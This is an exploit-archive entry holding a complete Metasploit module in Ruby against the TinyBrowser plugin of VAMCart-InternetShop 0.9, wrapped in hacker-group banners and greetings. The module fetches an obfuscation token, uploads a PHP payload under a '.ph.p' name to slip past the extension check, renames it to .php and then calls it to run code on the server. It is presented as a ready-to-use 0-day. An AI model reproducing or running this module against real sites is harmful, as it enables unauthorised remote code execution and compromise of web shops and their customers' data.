@@ -1,0 +1,234 @@
+id: 18389
+date: 05/30/2012
+title: VAMCart-InternetShop v0.9 (TinyBrowser) File Upload Code Execution
+author: KedAns-Dz
+cves: 
+
+1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
+0     _                   __           __       __                     1
+1   /' \            __  /'__`\        /\ \__  /'__`\                   0
+0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
+1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
+0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
+1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
+0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
+1                  \ \____/ >> Exploit database separated by exploit   0
+0                   \/___/          type (local, remote, DoS, etc.)    1
+1                                                                      1
+0  [+] Site            : 1337day.com                                   0
+1  [+] Support e-mail  : submit[at]1337day.com                         1
+0                                                                      0
+1               #########################################              1
+0               I'm KedAns-Dz member from Inj3ct0r Team                1
+1               #########################################              0
+0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
+
+###
+# Title : VAMCart-InternetShop v0.9 (TinyBrowser) File Upload Code Execution
+# Author : KedAns-Dz
+# E-mail : ked-h (@hotmail.com / @1337day.com / @exploit-id.com / @dis9.com)
+# Home : Hassi.Messaoud (30500) - Algeria -(00213555248701)
+# Web Site : www.1337day.com | www.inj3ct0rs.com
+# FaCeb0ok : http://fb.me/Inj3ct0rK3d
+# Friendly Sites : www.dis9.com * www.r00tw0rm.com * www.exploit-id.com
+# platform : php
+# Type : Metasploit
+# Security Risk : Critical
+# Tested on : Windows XP-SP3 (Fr) / Ubuntu 10.10
+###
+
+##
+# | >> --------+++=[ Dz Offenders Cr3w ]=+++-------- << |
+# | > Indoushka * KedAns-Dz * Caddy-Dz * Kalashinkov3   |
+# | Jago-dz * Over-X * Kha&miX * Ev!LsCr!pT_Dz * soucha |
+# | ***** KinG Of PiraTeS * The g0bl!n * dr.R!dE  ***** |
+# | ------------------------------------------------- < |
+##
+
+# <3 <3 Greetings t0 Palestine <3 <3
+
+# Download : [http://vamcart.googlecode.com/files/vamcart.zip]
+
+### (!) Exploit ==>
+
+require 'msf/core'
+
+
+class Metasploit3 < Msf::Exploit::Remote
+
+	include Msf::Exploit::Remote::HttpClient
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'           => 'VAMCart-InternetShop v0.9 (TinyBrowser) File Upload Code Execution',
+			'Description'    => %q{
+				This module exploits a vulnerability in the TinyMCE/tinybrowser plugin.
+				This plugin is not secured in version 0.9 of VAMCart and allows the upload
+				of files on the remote server. 
+				By renaming the uploaded file this vulnerability can be used to upload/execute
+				code on the affected system.
+			},
+			'Author'         => [ 'KedAns-Dz <ked-h[at]1337day.com>' ],
+			'License'        => MSF_LICENSE,
+			'Version'        => '$Revision$',
+			'References'     =>
+				[
+					['URL', '0-day'], # New p0c/0-day
+				],
+			'Privileged'     => false,
+			'Payload'        =>
+				{
+					'DisableNops' => true,
+					'Compat'      => 
+						{
+							'ConnectionType' => 'find',
+						},
+					'Space'       => 1024,
+				},
+			'Platform'       => 'php',
+			'Arch'           => ARCH_PHP,
+			'Targets'        => [[ 'Automatic', { }]],
+			'DisclosureDate' => 'Mai 29 2012',
+			'DefaultTarget'  => 0))
+
+			register_options(
+				[
+					OptString.new('URI', [true, "VAMCart directory path", "/"]),
+				], self.class)
+	end
+
+	def check
+		res = send_request_raw({
+			'uri'     => datastore['URI'] + '/js/tiny_mce/plugins/tinybrowser/upload.php?type=file&folder='
+		}, 25)
+
+		if (res and res.body =~ /flexupload.swf/)
+			
+			return Exploit::CheckCode::Vulnerable
+	
+		end
+
+		return Exploit::CheckCode::Safe
+	end
+
+
+	def retrieve_obfuscation()
+
+	end
+
+
+	def exploit
+
+		cmd_php = '<?php ' + payload.encoded + '?>'
+		
+		# Generate some random strings
+		cmdscript	= rand_text_alpha_lower(20) 
+		boundary = rand_text_alphanumeric(6)
+
+		# Static files
+		directory 	= '/files/'
+		tinybrowserpath = '/js/tiny_mce/plugins/tinybrowser/'
+		cmdpath 	= directory + cmdscript 
+
+		# Get obfuscation code (needed to upload files)
+		obfuscation_code = nil
+		res = send_request_raw({
+			'uri'     => datastore['URI'] + tinybrowserpath + '/upload.php?type=file&folder='
+		}, 25)
+
+		if (res)
+			
+			if(res.body =~ /"obfus", "((\w)+)"\)/)
+				obfuscation_code = $1
+				print_status("Successfully retrieved obfuscation code: #{obfuscation_code}")
+			else
+				print_error("Error retrieving obfuscation code!")
+				return
+			end
+		end
+		
+		
+
+		# Upload shellcode (file ending .ph.p)
+		data = "--#{boundary}\r\nContent-Disposition: form-data; name=\"Filename\"\r\n\r\n"
+		data << "#{cmdscript}.ph.p\r\n--#{boundary}"
+		data << "\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"#{cmdscript}.ph.p\"\r\n"
+		data << "Content-Type: application/octet-stream\r\n\r\n"
+		data << cmd_php
+		data << "\r\n--#{boundary}--"
+
+		res = send_request_raw({																													
+			'uri'	  => datastore['URI'] + tinybrowserpath + "/upload_file.php?folder=/files/&type=file&feid=&obfuscate=#{obfuscation_code}&sessidpass=",
+			'method'  => 'POST',
+			'data'    => data,
+			'headers' =>
+			{
+				'Content-Length' => data.length,
+				'Content-Type'	 => 'multipart/form-data; boundary=' + boundary,
+			}
+		}, 25)
+
+		if (res and res.body =~ /File Upload Success/)
+			print_status("Successfully uploaded #{cmdscript}.ph.p")
+		else
+			print_error("Error uploading #{cmdscript}.ph.p")
+		end
+		
+		
+		# Complete the upload process (rename file)
+		print_status("Renaming file from #{cmdscript}.ph.p_ to #{cmdscript}.ph.p")		
+		res = send_request_raw({
+			'uri'     => datastore['URI'] + tinybrowserpath + 'upload_process.php?folder=/files/&type=file&feid=&filetotal=1'
+		})
+		
+		
+		# Rename the file from .ph.p to .php
+		res = send_request_cgi({
+                        'method'    => 'POST',
+                        'uri'       => datastore['URI'] + tinybrowserpath + '/edit.php?type=file&folder=',        
+                        'vars_post' => 
+                        {
+                                'actionfile[0]' => "#{cmdscript}.ph.p",
+				'renameext[0]'   => 'p',
+				'renamefile[0]' => "#{cmdscript}.ph",
+				'sortby' => 'name',
+				'sorttype' => 'asc',
+				'showpage' => '0',
+				'action' => 'rename',
+				'commit' => '',
+				
+                        }
+                }, 10)
+		
+		if (res and res.body =~ /successfully renamed./) 
+			print_status ("Renamed #{cmdscript}.ph.p to #{cmdscript}.php")
+		else
+			print_error("Failed to rename #{cmdscript}.ph.p to #{cmdscript}.php")
+		end
+		
+		
+		# Finally call the payload
+		print_status("Calling payload: #{cmdscript}.php")
+		res = send_request_raw({
+			'uri'	=> "#{datastore['URI'] }files/#{cmdscript}.php"
+		}, 25)
+		
+
+	end
+end
+
+### << ThE|End
+
+#================[ Exploited By KedAns-Dz * Inj3ct0r Team * ]===============================================
+# Greets To : Dz Offenders Cr3w < Algerians HaCkerS > | Caddy-Dz * Mennouchi Islem * Rizky Oz * HMD-Cr3w
+# +> Greets To Inj3ct0r Operators Team : r0073r * Sid3^effectS * r4dc0re (1337day.com) * CrosS (r00tw0rm.com)
+# Inj3ct0r Members 31337 : Indoushka * KnocKout * SeeMe * Kalashinkov3 * ZoRLu * anT!-Tr0J4n * Angel Injection
+# NuxbieCyber (www.1337day.com/team) * Dz Offenders Cr3w * Algerian Cyber Army * xDZx * TM.mOsta * HD Moore
+# Exploit-ID Team : jos_ali_joe + Caddy-Dz + kaMtiEz + r3m1ck (exploit-id.com) * Jago-dz * Over-X * KeyStr0ke
+# JF * Kha&miX * Ev!LsCr!pT_Dz * KinG Of PiraTeS * TrOoN * T0xic * L3b-r1Z * Chevr0sky * Black-ID * Dis9-UE
+# packetstormsecurity.org * metasploit.com * r00tw0rm.com * OWASP Dz * All Security and Exploits Webs ..
+#===========================================================================================================
+
+
+
+#  0day.today [2023-03-22]  #
